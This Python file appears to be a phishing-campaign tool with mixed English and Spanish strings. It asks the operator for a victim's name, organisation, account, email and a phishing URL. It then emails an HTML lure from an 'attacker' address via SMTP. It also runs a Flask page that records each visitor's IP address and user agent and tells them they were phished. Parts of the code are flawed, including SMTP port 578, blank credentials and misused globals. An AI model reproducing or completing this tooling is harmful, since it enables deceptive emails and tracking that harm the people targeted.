import os
import time

#email import libraries
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

#Web Portal
from flask import Flask, request, jsonify, redirect, url_for
import uuid


def getPath():
    currentPath = os.getcwd()

    # generate the aperance of the terminal of the user to make inputs
    print(f"\x1b[91m{os.path.basename(currentPath)}\x1b[0m:", currentPath)

def generateFolderReport():
    # Creating new folders for the final report
    reportsFolder = "reportsCampana"
    
    if not os.path.exists(reportsFolder):
        os.makedirs(reportsFolder)
        print(f"Folder " + reportsFolder + " created successfully!")
    else:
        print(f"Folder " + reportsFolder + " already exists")

def sendMensageToVictim(htmlTosend,subject,emailofthevictim, emailoftheatacker):
    # Process of send to the victim the template generated
    print("\n Starting process to send the template selectedto the victim\n")

    #Present configuration of smtp conexion
    port=578
    smtpServer=""
    login="api"
    password=""

    #Create MimeText objets
    message=MIMEMultipart()
    message["From"]=emailoftheatacker
    message["To"]=emailofthevictim
    message["Subject"]=subject

    #Attach HTML
    message.attach(MIMEText(htmlTosend,"html"))

    #Send the email
    with smtplib.SMTP(smtpServer,port) as server:
        server.starttls()
        server.login(login,password)
        server.sendmail(emailoftheatacker,emailofthevictim,message.as_string())

    print("Phishing Email was send\n Enjoy the results")

def generateUrlAccess():
    #Generating of an URL to access
    app=Flask(__name__)

    #Data Storage
    dataEntry=[]
    numEntries=0

    print("\Generating the Url to make the phishing")
    userData={}

    @app.route('/',methods=['GET'])
    def getInfoUser():
        
        global dataEntry, numEntries
        #Get ip of the client
        client_ip= request.remote_addr
        #Get user-agent headers 
        user_agent = request.headers.get('User-Agent')
        #Add a new entry
        numEntries+=1
        
        #Adding data intern db 
        clientInfo={
            'user_id': numEntries,
            'ip': client_ip,
            'user_agent': user_agent
        }
        dataEntry.append(clientInfo)
        return jsonify({'message': 'Entry added successfully! You was phished :)', 'data_count': numEntries})
    
    @app.route('/report',methods=['GET'])
    def prevewReport():
        global dataEntry, numEntries
        return jsonify({'data': dataEntry, 'data_count': numEntries})
    
    if __name__ == '__main__':
        app.run(debug=True, port=5000)
        
        
def get_input_es():
    #Información de la victima
    userName = input("Enter the name of your victim-->")
    organization = input("Enter the organizacion-->")
    userAccount = input("Introduce la cuenta de usuario de tu victima-->")
    url=input("Introduce el URL de phishing-->")
    userEmail=input("Introduce el email de la victima-->")
    
    date=time.localtime()
    currentDate=time.strftime("%D %B %Y, %H:%M:%S",date)
    
    return userName,organization,url,userEmail,currentDate,userAccount

def get_inputs_en():
    #Info of the victim
    userName = input("Enter the name of your victim-->")
    organization = input("Enter the organiza-->")
    userAccount = input("Enter the username of the victim's account-->")
    url=input("Enter the phishing URL-->")
    userEmail=input("Enter the victim's email-->")
    
    #data time
    date=time.localtime()
    currentDate=time.strftime("%D %B %Y, %H:%M:%S",date)
    
    return userName,organization,url,userEmail,currentDate,userAccount